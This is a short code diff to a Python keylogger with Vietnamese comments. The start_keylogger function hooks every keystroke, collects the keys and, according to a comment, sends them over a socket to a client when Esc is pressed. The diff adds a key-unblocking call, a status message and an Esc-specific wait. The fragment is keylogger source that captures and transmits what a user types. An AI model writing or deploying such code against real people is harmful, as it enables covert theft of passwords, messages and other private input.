@@ -12,6 +12,7 @@ def start_keylogger(client_socket):
     def on_key_event(event):
         if event.name == 'esc':  # Nếu phím Esc được nhấn, dừng keylogger
             keyboard.unhook_all()  # Hủy bỏ tất cả các hook
+            unblock_all_keys()  # Mở khóa tất cả các phím
             print("Keylogger stopped.")
             # Gửi các phím đã ghi lại về client khi keylogger dừng lại
             if keys:
@@ -22,7 +23,8 @@ def start_keylogger(client_socket):
 
     # Thiết lập hook để bắt các phím
     keyboard.hook(on_key_event)
-    keyboard.wait()  # Chờ cho đến khi có sự kiện
+    print("Keylogger is running. Press 'Esc' to stop.")
+    keyboard.wait('esc')  # Chờ cho đến khi có sự kiện Esc được nhấn
 
 def unblock_all_keys():
     """Mở khóa tất cả các phím."""
